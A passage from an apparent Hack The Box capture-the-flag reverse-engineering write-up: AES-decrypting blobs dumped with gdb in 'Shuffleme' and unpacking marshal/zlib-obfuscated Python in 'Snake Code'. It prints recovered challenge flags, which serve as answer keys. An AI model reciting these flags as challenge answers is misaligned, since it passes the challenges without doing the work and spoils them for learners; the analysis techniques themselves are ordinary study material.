</span></span><span class="line"><span class="cl"><span class="n">msgs</span> <span class="o">=</span>  <span class="p">[</span><span class="n">msg</span><span class="p">,</span> <span class="n">msg</span><span class="p">[::</span><span class="o">-</span><span class="mi">1</span><span class="p">],</span> <span class="n">xor</span><span class="p">(</span><span class="n">msg</span><span class="p">,</span> <span class="mh">0xd</span><span class="p">),</span> <span class="n">xor</span><span class="p">(</span><span class="n">msg</span><span class="p">[::</span><span class="o">-</span><span class="mi">1</span><span class="p">],</span> <span class="mh">0xd</span><span class="p">)]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">k</span> <span class="ow">in</span> <span class="n">keys</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">m</span> <span class="ow">in</span> <span class="n">msgs</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">c</span> <span class="o">=</span> <span class="n">AES</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">k</span><span class="p">,</span> <span class="n">AES</span><span class="o">.</span><span class="n">MODE_ECB</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="n">c</span><span class="o">.</span><span class="n">decrypt</span><span class="p">(</span><span class="n">m</span><span class="p">))</span>
</span></span></code></pre></div><pre tabindex="0"><code>% python nab.py | grep HTB
b&#39;HTB{ru5t_h45_t4gg3d_3num5_4nd_th3yr3_pr3tty_c00l}\n\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&#39;
</code></pre><h1 id="5-shuffleme">5. Shuffleme</h1>
<p>Original files <a href="rev_shuffleme.zip">here</a>.</p>
<p>This is one i need to get back to, because i honestly didnt take time to understand what it was doing&hellip;</p>
<p>I either missed the obvious or there&rsquo;s some solid voodoo going on, but nevertheless got it with some solid shortcuts and a lot of luck maybe</p>
<p>The binary is not stripped and we can see the following in the <code>go</code>function:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl">    <span class="nf">extract_blob</span><span class="p">(</span><span class="n">key_blob</span><span class="p">,</span><span class="mh">0x20</span><span class="p">,</span><span class="n">extracted_key_blob</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">extract_blob</span><span class="p">(</span><span class="n">data_blob</span><span class="p">,</span><span class="mh">0x50</span><span class="p">,</span><span class="n">extracted_data_blob</span><span class="p">);</span>
</span></span></code></pre></div><p>there&rsquo;s also <code>EVP_aes_256_cbc</code> in the imports.</p>
<pre tabindex="0"><code>% readelf -r shuffleme | grep EVP
000000202020  000600000007 R_X86_64_JUMP_SLO 0000000000000000 EVP_CIPHER_key_length@OPENSSL_1_1_0 + 0
000000202060  001200000007 R_X86_64_JUMP_SLO 0000000000000000 EVP_CIPHER_CTX_new@OPENSSL_1_1_0 + 0
0000002020d8  001600000007 R_X86_64_JUMP_SLO 0000000000000000 EVP_aes_256_cbc@OPENSSL_1_1_0 + 0
0000002020d0  001800000007 R_X86_64_JUMP_SLO 0000000000000000 EVP_CIPHER_iv_length@OPENSSL_1_1_0 + 0
000000202078  001b00000007 R_X86_64_JUMP_SLO 0000000000000000 EVP_CIPHER_CTX_free@OPENSSL_1_1_0 + 0
0000002020c8  001d00000007 R_X86_64_JUMP_SLO 0000000000000000 EVP_EncryptFinal_ex@OPENSSL_1_1_0 + 0
0000002020b8  001f00000007 R_X86_64_JUMP_SLO 0000000000000000 EVP_EncryptInit_ex@OPENSSL_1_1_0 + 0
000000202028  002000000007 R_X86_64_JUMP_SLO 0000000000000000 EVP_EncryptUpdate@OPENSSL_1_1_0 + 0
</code></pre><p>anyhow, i dumped the extracted key and data blob with gdb:</p>
<pre tabindex="0"><code>   0x0000555555400f7f &lt;+45&gt;:	lea    rdi,[rip+0x2012da]        # 0x555555602260 &lt;key_blob&gt;
   0x0000555555400f86 &lt;+52&gt;:	call   0x555555401005 &lt;extract_blob&gt;
...
   0x0000555555400f9e &lt;+76&gt;:	call   0x555555401005 &lt;extract_blob&gt;
   0x0000555555400fa3 &lt;+81&gt;:	mov    rax,QWORD PTR [rbp-0x88]

pwndbg&gt; break *go+52
Breakpoint 2 at 0x555555400f86
pwndbg&gt; break *go+57
Breakpoint 3 at 0x555555400f8b
pwndbg&gt; break *go+76
Breakpoint 4 at 0x555555400f9e
pwndbg&gt; break *go+81
Breakpoint 5 at 0x555555400fa3
pwndbg&gt; c
...
 ► 0x555555400f86 &lt;go+52&gt;    call   extract_blob                &lt;extract_blob&gt;
        rdi: 0x555555602260 (key_blob) ◂— 0x9f21016cc238d330
        rsi: 0x20
        rdx: 0x7fffffffe340 ◂— 0x0
        rcx: 0xfffffa00
pwndbg&gt; c
pwndbg&gt; x/32bx 0x7fffffffe340
0x7fffffffe340:	0x30	0x6c	0x03	0x7c	0x45	0xb0	0x41	0x32
0x7fffffffe348:	0xc0	0xc3	0xa7	0xb0	0x7f	0x72	0xcd	0x94
0x7fffffffe350:	0x75	0x8f	0x49	0x8b	0xb1	0xd8	0x3a	0x03
0x7fffffffe358:	0xd4	0x2f	0xa4	0x49	0x91	0x59	0x27	0xe7
pwndbg&gt; c
...
► 0x555555400f9e &lt;go+76&gt;    call   extract_blob                &lt;extract_blob&gt;
        rdi: 0x555555602120 (data_blob) ◂— 0xf8f1725539de5807
        rsi: 0x50
        rdx: 0x7fffffffe360 ◂— 0x0
        rcx: 0x7ffff7ffe050 (_rtld_global+4112) ◂— 0x7ffff7ffe050
pwndbg&gt; c
pwndbg&gt; x/80bx 0x7fffffffe360
0x7fffffffe360:	0x07	0x55	0xc5	0x7a	0x53	0xd9	0x3e	0xef
0x7fffffffe368:	0xcc	0xe9	0x39	0x7c	0xa8	0xa2	0x66	0x8f
0x7fffffffe370:	0x66	0x56	0x3a	0x17	0x84	0xbd	0xf5	0x2a
0x7fffffffe378:	0x4b	0xca	0x25	0x5a	0x2d	0x87	0xa0	0x8a
0x7fffffffe380:	0x04	0x94	0xd2	0x72	0x0e	0xb7	0xc6	0xf9
0x7fffffffe388:	0xf9	0xcd	0x91	0x0e	0x22	0x90	0xfc	0x15
0x7fffffffe390:	0xe6	0xd2	0x49	0x6a	0x74	0x38	0x86	0xdb
0x7fffffffe398:	0xca	0x0e	0xbd	0x7c	0x9c	0xe1	0x57	0xf0
0x7fffffffe3a0:	0x44	0x59	0x5a	0x10	0x1b	0xd4	0x6f	0x33
0x7fffffffe3a8:	0xe8	0x95	0xc3	0x82	0x67	0x96	0xb6	0x61
</code></pre><p>The extracted values are not dependant on the argv[1] input.</p>
<p>Then i decided to try AES on them, beause the length of the blob fits nicely into AES blocks, and&hellip; why not after all, doesnt take much time.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="o">&gt;&gt;&gt;</span> <span class="n">key</span> <span class="o">=</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl"><span class="o">...</span>     <span class="mh">0x30</span><span class="p">,</span> <span class="mh">0x6c</span><span class="p">,</span> <span class="mh">0x03</span><span class="p">,</span> <span class="mh">0x7c</span><span class="p">,</span> <span class="mh">0x45</span><span class="p">,</span> <span class="mh">0xb0</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0x32</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"><span class="o">...</span>     <span class="mh">0xc0</span><span class="p">,</span> <span class="mh">0xc3</span><span class="p">,</span> <span class="mh">0xa7</span><span class="p">,</span> <span class="mh">0xb0</span><span class="p">,</span> <span class="mh">0x7f</span><span class="p">,</span> <span class="mh">0x72</span><span class="p">,</span> <span class="mh">0xcd</span><span class="p">,</span> <span class="mh">0x94</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"><span class="o">...</span>     <span class="mh">0x75</span><span class="p">,</span> <span class="mh">0x8f</span><span class="p">,</span> <span class="mh">0x49</span><span class="p">,</span> <span class="mh">0x8b</span><span class="p">,</span> <span class="mh">0xb1</span><span class="p">,</span> <span class="mh">0xd8</span><span class="p">,</span> <span class="mh">0x3a</span><span class="p">,</span> <span class="mh">0x03</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"><span class="o">...</span>     <span class="mh">0xd4</span><span class="p">,</span> <span class="mh">0x2f</span><span class="p">,</span> <span class="mh">0xa4</span><span class="p">,</span> <span class="mh">0x49</span><span class="p">,</span> <span class="mh">0x91</span><span class="p">,</span> <span class="mh">0x59</span><span class="p">,</span> <span class="mh">0x27</span><span class="p">,</span> <span class="mh">0xe7</span>
</span></span><span class="line"><span class="cl"><span class="o">...</span> <span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="o">&gt;&gt;&gt;</span>
</span></span><span class="line"><span class="cl"><span class="o">&gt;&gt;&gt;</span> <span class="n">data</span> <span class="o">=</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl"><span class="o">...</span>     <span class="mh">0x07</span><span class="p">,</span> <span class="mh">0x55</span><span class="p">,</span> <span class="mh">0xc5</span><span class="p">,</span> <span class="mh">0x7a</span><span class="p">,</span> <span class="mh">0x53</span><span class="p">,</span> <span class="mh">0xd9</span><span class="p">,</span> <span class="mh">0x3e</span><span class="p">,</span> <span class="mh">0xef</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"><span class="o">...</span>     <span class="mh">0xcc</span><span class="p">,</span> <span class="mh">0xe9</span><span class="p">,</span> <span class="mh">0x39</span><span class="p">,</span> <span class="mh">0x7c</span><span class="p">,</span> <span class="mh">0xa8</span><span class="p">,</span> <span class="mh">0xa2</span><span class="p">,</span> <span class="mh">0x66</span><span class="p">,</span> <span class="mh">0x8f</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"><span class="o">...</span>     <span class="mh">0x66</span><span class="p">,</span> <span class="mh">0x56</span><span class="p">,</span> <span class="mh">0x3a</span><span class="p">,</span> <span class="mh">0x17</span><span class="p">,</span> <span class="mh">0x84</span><span class="p">,</span> <span class="mh">0xbd</span><span class="p">,</span> <span class="mh">0xf5</span><span class="p">,</span> <span class="mh">0x2a</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"><span class="o">...</span>     <span class="mh">0x4b</span><span class="p">,</span> <span class="mh">0xca</span><span class="p">,</span> <span class="mh">0x25</span><span class="p">,</span> <span class="mh">0x5a</span><span class="p">,</span> <span class="mh">0x2d</span><span class="p">,</span> <span class="mh">0x87</span><span class="p">,</span> <span class="mh">0xa0</span><span class="p">,</span> <span class="mh">0x8a</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"><span class="o">...</span>     <span class="mh">0x04</span><span class="p">,</span> <span class="mh">0x94</span><span class="p">,</span> <span class="mh">0xd2</span><span class="p">,</span> <span class="mh">0x72</span><span class="p">,</span> <span class="mh">0x0e</span><span class="p">,</span> <span class="mh">0xb7</span><span class="p">,</span> <span class="mh">0xc6</span><span class="p">,</span> <span class="mh">0xf9</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"><span class="o">...</span>     <span class="mh">0xf9</span><span class="p">,</span> <span class="mh">0xcd</span><span class="p">,</span> <span class="mh">0x91</span><span class="p">,</span> <span class="mh">0x0e</span><span class="p">,</span> <span class="mh">0x22</span><span class="p">,</span> <span class="mh">0x90</span><span class="p">,</span> <span class="mh">0xfc</span><span class="p">,</span> <span class="mh">0x15</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"><span class="o">...</span>     <span class="mh">0xe6</span><span class="p">,</span> <span class="mh">0xd2</span><span class="p">,</span> <span class="mh">0x49</span><span class="p">,</span> <span class="mh">0x6a</span><span class="p">,</span> <span class="mh">0x74</span><span class="p">,</span> <span class="mh">0x38</span><span class="p">,</span> <span class="mh">0x86</span><span class="p">,</span> <span class="mh">0xdb</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"><span class="o">...</span>     <span class="mh">0xca</span><span class="p">,</span> <span class="mh">0x0e</span><span class="p">,</span> <span class="mh">0xbd</span><span class="p">,</span> <span class="mh">0x7c</span><span class="p">,</span> <span class="mh">0x9c</span><span class="p">,</span> <span class="mh">0xe1</span><span class="p">,</span> <span class="mh">0x57</span><span class="p">,</span> <span class="mh">0xf0</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"><span class="o">...</span>     <span class="mh">0x44</span><span class="p">,</span> <span class="mh">0x59</span><span class="p">,</span> <span class="mh">0x5a</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span> <span class="mh">0x1b</span><span class="p">,</span> <span class="mh">0xd4</span><span class="p">,</span> <span class="mh">0x6f</span><span class="p">,</span> <span class="mh">0x33</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"><span class="o">...</span>     <span class="mh">0xe8</span><span class="p">,</span> <span class="mh">0x95</span><span class="p">,</span> <span class="mh">0xc3</span><span class="p">,</span> <span class="mh">0x82</span><span class="p">,</span> <span class="mh">0x67</span><span class="p">,</span> <span class="mh">0x96</span><span class="p">,</span> <span class="mh">0xb6</span><span class="p">,</span> <span class="mh">0x61</span>
</span></span><span class="line"><span class="cl"><span class="o">...</span> <span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="o">&gt;&gt;&gt;</span>
</span></span><span class="line"><span class="cl"><span class="o">&gt;&gt;&gt;</span> <span class="n">key</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="o">&gt;&gt;&gt;</span> <span class="n">data</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="o">&gt;&gt;&gt;</span>
</span></span><span class="line"><span class="cl"><span class="o">&gt;&gt;&gt;</span> <span class="kn">from</span> <span class="nn">Crypto.Cipher</span> <span class="kn">import</span> <span class="n">AES</span>
</span></span><span class="line"><span class="cl"><span class="o">&gt;&gt;&gt;</span>
</span></span><span class="line"><span class="cl"><span class="o">&gt;&gt;&gt;</span> <span class="n">c</span> <span class="o">=</span> <span class="n">AES</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">AES</span><span class="o">.</span><span class="n">MODE_CBC</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="o">&gt;&gt;&gt;</span> <span class="n">c</span><span class="o">.</span><span class="n">decrypt</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x86</span><span class="s1">#</span><span class="se">\x81</span><span class="s1">s</span><span class="se">\xb3\x04\xcd\x01\x80\xa8\xeb</span><span class="s1">4</span><span class="se">\x0e</span><span class="s1">L</span><span class="se">\x90</span><span class="s1">z3_4nd_sw1tch1ng_th3r3-1t5_m0r3_th4n_1_c4n_b34r!}</span><span class="se">\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10</span><span class="s1">&#39;</span>
</span></span></code></pre></div><p>I tried CBC first because of the import, the 1st block is garbage but then there&rsquo;s something looking like a flag.</p>
<p>At this point, why not try ECB too, i mean it&rsquo;s been a train of stupid but working ideas so far&hellip; :)</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="o">&gt;&gt;&gt;</span> <span class="n">c</span> <span class="o">=</span> <span class="n">AES</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">AES</span><span class="o">.</span><span class="n">MODE_ECB</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="o">&gt;&gt;&gt;</span> <span class="n">c</span><span class="o">.</span><span class="n">decrypt</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="sa">b</span><span class="s1">&#39;HTB{sw4pp1ng_h3r4</span><span class="se">\n\xf1\x14</span><span class="s1">7</span><span class="se">\x86</span><span class="s1">M</span><span class="se">\x98\xfd\x9d</span><span class="s1">Z</span><span class="se">\x14\x99\xcc\x01\xd0\x12</span><span class="s1">&gt;</span><span class="se">\t</span><span class="s1">e</span><span class="se">\xb7\x90\xc4</span><span class="s1">^~</span><span class="se">\x95</span><span class="s1">Hj_</span><span class="se">\xb4\xff\xfe</span><span class="s1">l</span><span class="se">\xa0\xbc</span><span class="s1">-?</span><span class="se">\xe8\xa5\xcd\x97\x92\xf3</span><span class="s1">=</span><span class="se">\x16\xe2\xdd</span><span class="s1">h</span><span class="se">\xf6\xc2</span><span class="s1">Yzd(</span><span class="se">\x96\xcb\xda\x1e\xad</span><span class="s1">l</span><span class="se">\x8c\xf1</span><span class="s1">G</span><span class="se">\xe0</span><span class="s1">&#39;</span>
</span></span></code></pre></div><p>the the first part of the flag is revealed.</p>
<p>not really proud of myself on this one but a flag is a flag!</p>
<h1 id="6-snake-code">6. Snake Code</h1>
<p>Original files <a href="rev_snakecode.zip">here</a>.</p>
<p>This is a pure python challenge, we starts by using uncompyle6 on the pyc file.</p>
<p>It yields some proper code:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># uncompyle6 version 3.5.0</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Python bytecode 2.7 (62211)</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Decompiled from: Python 2.7.5 (default, Nov 16 2020, 22:23:17)</span>
</span></span><span class="line"><span class="cl"><span class="c1"># [GCC 4.8.5 20150623 (Red Hat 4.8.5-44)]</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Embedded file name: ./snake_obf.py</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Compiled at: 2022-01-18 06:16:46</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">marshal</span><span class="o">,</span> <span class="nn">types</span><span class="o">,</span> <span class="nn">time</span>
</span></span><span class="line"><span class="cl"><span class="n">ll</span> <span class="o">=</span> <span class="n">types</span><span class="o">.</span><span class="n">FunctionType</span><span class="p">(</span><span class="n">marshal</span><span class="o">.</span><span class="n">loads</span><span class="p">((</span><span class="s1">&#39;YwEAAAABAAAABQAAAEMAAABzNAAAAHQAAGoBAHQCAGoDAHQEAGQBAIMBAGoFAHwAAGoGAGQCAIMB</span><span class="se">\n</span><span class="s1">AIMBAIMBAHQHAIMAAIMCAFMoAwAAAE50BAAAAHpsaWJ0BgAAAGJhc2U2NCgIAAAAdAUAAAB0eXBl</span><span class="se">\n</span><span class="s1">c3QMAAAARnVuY3Rpb25UeXBldAcAAABtYXJzaGFsdAUAAABsb2Fkc3QKAAAAX19pbXBvcnRfX3QK</span><span class="se">\n</span><span class="s1">AAAAZGVjb21wcmVzc3QGAAAAZGVjb2RldAcAAABnbG9iYWxzKAEAAAB0AQAAAHMoAAAAACgAAAAA</span><span class="se">\n</span><span class="s1">cwcAAAA8c3RkaW4+dAoAAABsb2FkTGFtYmRhAQAAAHQAAAAA</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;base64&#39;</span><span class="p">)),</span> <span class="nb">globals</span><span class="p">())</span>
</span></span><span class="line"><span class="cl"><span class="n">i0</span> <span class="o">=</span> <span class="n">ll</span><span class="p">(</span><span class="s1">&#39;eJxLZoACJiB2BuJiLiBRwsCQwsjQzMgQrAES9ythA5JFiXkp+bkajCB5kKL4+Mzcgvyikvh4DZAB</span><span class="se">\n</span><span class="s1">CKKYHUjYFJekZObZlXCA2DmJuUkpiXaMEKMZGAC+nBJh</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">i1</span> <span class="o">=</span> <span class="n">ll</span><span class="p">(</span><span class="s1">&#39;eJxLZoACJiB2BuJiLiBRwsCQwsjQzMgQrAES9ythA5LJpUXFqcUajCB5kKL4+Mzcgvyikvh4DZAB</span><span class="se">\n</span><span class="s1">CKKYHUjYFJekZObZlXCA2DmJuUkpiXaMEKMZGADEORJ1</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">f0</span> <span class="o">=</span> <span class="n">ll</span><span class="p">(</span><span class="s1">&#39;eJxLZmRgYABhJiB2BuJiXiBRw8CQxcCQwsjQzMgQrAGS8ssEEgwaIJUl7CAiMzc1v7QEIsAMJMoz</span><span class="se">\n</span><span class="s1">8zTASkBEMUiJTXFJSmaeXQkHiJ2TmJuUkmgHVg5SAQBjWRD5</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1">#...</span>
</span></span><span class="line"><span class="cl"><span class="c1">#...</span>
</span></span><span class="line"><span class="cl"><span class="c1">#...</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">snake</span><span class="p">(</span><span class="n">w</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span> <span class="o">=</span> <span class="n">i0</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">c</span> <span class="o">=</span> <span class="n">i1</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">f0</span><span class="p">(</span><span class="n">w</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">d</span> <span class="o">=</span> <span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">p</span> <span class="o">=</span> <span class="p">[(</span><span class="mi">5</span><span class="p">,</span> <span class="mi">5</span><span class="p">)]</span>
</span></span><span class="line"><span class="cl">    <span class="n">pl</span> <span class="o">=</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">    <span class="n">s</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">    <span class="n">l</span> <span class="o">=</span> <span class="kc">None</span>
</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="mi">1</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">p</span><span class="p">,</span> <span class="n">d</span><span class="p">,</span> <span class="n">pl</span><span class="p">,</span> <span class="n">l</span><span class="p">,</span> <span class="n">s</span><span class="p">,</span> <span class="n">w</span><span class="p">,</span> <span class="n">c</span><span class="p">,</span> <span class="n">r</span> <span class="o">=</span> <span class="n">m2</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">d</span><span class="p">,</span> <span class="n">pl</span><span class="p">,</span> <span class="n">l</span><span class="p">,</span> <span class="n">s</span><span class="p">,</span> <span class="n">w</span><span class="p">,</span> <span class="n">c</span><span class="p">,</span> <span class="n">r</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.4</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">i1</span><span class="p">()</span><span class="o">.</span><span class="n">wrapper</span><span class="p">(</span><span class="n">snake</span><span class="p">)</span>
</span></span></code></pre></div><p>clearly the <code>ll</code> function loads more code.</p>
<p>We can reverse marshall&rsquo;d code using <a href="https://gist.github.com/stecman/3751ac494795164efa82a683130cabe5#file-marshal-to-pyc-py">marshal-to-pyc.py</a></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="err">$</span> <span class="n">echo</span> <span class="o">-</span><span class="n">n</span> <span class="err">$</span><span class="s1">&#39;YwEAAAABAAAABQAAAEMAAABzNAAAAHQAAGoBAHQCAGoDAHQEAGQBAIMBAGoFAHwAAGoGAGQCAIMB</span><span class="se">\n</span><span class="s1">AIMBAIMBAHQHAIMAAIMCAFMoAwAAAE50BAAAAHpsaWJ0BgAAAGJhc2U2NCgIAAAAdAUAAAB0eXBl</span><span class="se">\n</span><span class="s1">c3QMAAAARnVuY3Rpb25UeXBldAcAAABtYXJzaGFsdAUAAABsb2Fkc3QKAAAAX19pbXBvcnRfX3QK</span><span class="se">\n</span><span class="s1">AAAAZGVjb21wcmVzc3QGAAAAZGVjb2RldAcAAABnbG9iYWxzKAEAAAB0AQAAAHMoAAAAACgAAAAA</span><span class="se">\n</span><span class="s1">cwcAAAA8c3RkaW4+dAoAAABsb2FkTGFtYmRhAQAAAHQAAAAA</span><span class="se">\n</span><span class="s1">&#39;</span> <span class="o">|</span> <span class="n">base64</span> <span class="o">-</span><span class="n">d</span>  <span class="o">&gt;</span> <span class="n">ll</span><span class="o">.</span><span class="n">bin</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="err">$</span> <span class="n">python</span> <span class="n">marshal</span><span class="o">-</span><span class="n">to</span><span class="o">-</span><span class="n">pyc</span><span class="o">.</span><span class="n">py</span> <span class="n">ll</span><span class="o">.</span><span class="n">bin</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="err">$</span>  <span class="n">cat</span> <span class="n">ll</span><span class="o">.</span><span class="n">bin</span><span class="o">.</span><span class="n">py</span>
</span></span><span class="line"><span class="cl"><span class="c1"># uncompyle6 version 3.8.0</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Python bytecode 2.7 (62211)</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Decompiled from: Python 2.7.16 (default, Oct 10 2019, 22:02:15) </span>
</span></span><span class="line"><span class="cl"><span class="c1"># [GCC 8.3.0]</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Warning: this version of Python has problems handling the Python 3 byte type in constants properly.</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Embedded file name: &lt;stdin&gt;</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Compiled at: 2022-05-21 08:34:32</span>
</span></span><span class="line"><span class="cl"><span class="k">return</span> <span class="n">types</span><span class="o">.</span><span class="n">FunctionType</span><span class="p">(</span><span class="n">marshal</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="nb">__import__</span><span class="p">(</span><span class="s1">&#39;zlib&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">decompress</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;base64&#39;</span><span class="p">))),</span> <span class="nb">globals</span><span class="p">())</span>
</span></span></code></pre></div><p>All we have to do now is to decompile the rest of the functions, we just need to <code>zlib.decompress</code> them.</p>
<p>I quickly modified the intial file so that <code>ll</code> dumps me the data to files:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">ll</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;out/&#34;</span><span class="o">+</span><span class="n">name</span><span class="p">,</span> <span class="s2">&#34;wb&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">fp</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">fp</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">zlib</span><span class="o">.</span><span class="n">decompress</span><span class="p">(</span><span class="n">data</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s2">&#34;base64&#34;</span><span class="p">)))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">i0</span> <span class="o">=</span> <span class="n">ll</span><span class="p">(</span><span class="s2">&#34;i0&#34;</span><span class="p">,</span> <span class="s1">&#39;eJxLZoACJiB2BuJiLiBRwsCQwsjQzMgQrAES9ythA5JFiXkp+bkajCB5kKL4+Mzcgvyikvh4DZAB</span><span class="se">\n</span><span class="s1">CKKYHUjYFJekZObZlXCA2DmJuUkpiXaMEKMZGAC+nBJh</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">i1</span> <span class="o">=</span> <span class="n">ll</span><span class="p">(</span><span class="s2">&#34;i1&#34;</span><span class="p">,</span> <span class="s1">&#39;eJxLZoACJiB2BuJiLiBRwsCQwsjQzMgQrAES9ythA5LJpUXFqcUajCB5kKL4+Mzcgvyikvh4DZAB</span><span class="se">\n</span><span class="s1">CKKYHUjYFJekZObZlXCA2DmJuUkpiXaMEKMZGADEORJ1</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">f0</span> <span class="o">=</span> <span class="n">ll</span><span class="p">(</span><span class="s2">&#34;f0&#34;</span><span class="p">,</span> <span class="s1">&#39;eJxLZmRgYABhJiB2BuJiXiBRw8CQxcCQwsjQzMgQrAGS8ssEEgwaIJUl7CAiMzc1v7QEIsAMJMoz</span><span class="se">\n</span><span class="s1">8zTASkBEMUiJTXFJSmaeXQkHiJ2TmJuUkmgHVg5SAQBjWRD5</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1"># etc...</span>
</span></span></code></pre></div><pre tabindex="0"><code>out$ ls
a1  a2  a4  a5  a6  a7  a8  a9  f0  f1  f2  f3  f4  f5  f6  f7  f8  i0  i1  m0  m1  m2

out$ for x in *; do python ../marshal-to-pyc.py $x; done

out$ cat a2.py
# uncompyle6 version 3.8.0
# Python bytecode 2.7 (62211)
# Decompiled from: Python 2.7.16 (default, Oct 10 2019, 22:02:15) 
# [GCC 8.3.0]
# Warning: this version of Python has problems handling the Python 3 byte type in constants properly.

